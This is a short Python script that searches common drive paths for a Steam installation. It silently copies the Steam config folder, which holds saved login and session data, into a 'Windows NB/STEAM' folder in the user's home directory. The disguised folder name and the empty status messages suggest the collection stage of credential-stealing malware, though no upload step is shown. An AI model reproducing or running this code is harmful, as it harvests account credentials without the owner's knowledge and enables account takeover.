import os
import shutil

def create_clients_folder():
    user_home = os.path.expanduser("~")
    target_path = os.path.join(user_home, "Windows NB", "STEAM")
    os.makedirs(target_path, exist_ok=True)
    return target_path
def copy_steam_config():
    user_home = os.path.expanduser("~")
    destination_path = create_clients_folder()
    steam_paths = [
        r"B:\Program Files (x86)\Steam\config",
        r"C:\Program Files (x86)\Steam\config",
        r"D:\Program Files (x86)\Steam\config",
        r"E:\Program Files (x86)\Steam\config",
        r"C:\Program Files\Steam\config",
        r"D:\Program Files\Steam\config",
        r"B:\Program Files\Steam\config",
        r"E:\Program Files\Steam\config",
        r"D:\Steam\config",
        r"E:\Steam\config",
        r"F:\Steam\config",
        r"C:\Steam\config",
        r"B:\Steam\config",
    ]
    config_copied = False
    for steam_config_path in steam_paths:
        if os.path.exists(steam_config_path):
            shutil.copytree(steam_config_path, os.path.join(destination_path, "config"), dirs_exist_ok=True)
            print(f"")
            config_copied = True
            break
    if not config_copied:
        print("")
copy_steam_config()

